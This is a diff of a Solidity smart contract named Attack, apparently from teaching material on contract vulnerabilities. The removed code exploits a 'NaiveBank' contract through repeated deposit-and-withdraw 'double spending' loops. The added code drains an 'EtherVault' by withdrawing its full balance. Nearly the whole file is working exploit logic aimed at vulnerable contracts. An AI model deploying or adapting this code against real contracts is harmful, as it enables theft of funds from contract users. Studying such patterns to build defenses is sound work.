@@ -1,31 +1,25 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 
-interface INaiveBank {
-    function deposit() external payable;
-    function withdraw(uint256 _withdrawAmount) external;
+interface IEtherVault {
+    function withdraw(uint256 _amount) external;
+    function getEtherBalance() external view returns (uint256);
 }
 
 contract Attack {
-    INaiveBank public immutable naiveBank;
+    IEtherVault public immutable etherVault;
 
-    constructor(INaiveBank _naiveBank) {
-        naiveBank = _naiveBank;
+    constructor(IEtherVault _etherVault) {
+        etherVault = _etherVault;
     }
 
-    receive() external payable {
+    receive() external payable {}
+
+    function attack() external {
+        etherVault.withdraw(etherVault.getEtherBalance());
     }
 
-    function attack(uint256 _xTimes) external payable {
-        require(msg.value == 1 ether, "Require 1 Ether to attack");
-
-        for (uint256 i = 0; i < _xTimes - 1; i++) {
-            // Do a double spending
-            naiveBank.deposit{value: msg.value}();
-            naiveBank.withdraw(msg.value);
-        }
-
-        // Do a final deposit and wait for the BIG PROFIT!!!
-        naiveBank.deposit{value: msg.value}();
+    function getEtherBalance() external view returns (uint256) {
+        return address(this).balance;
     }
 }
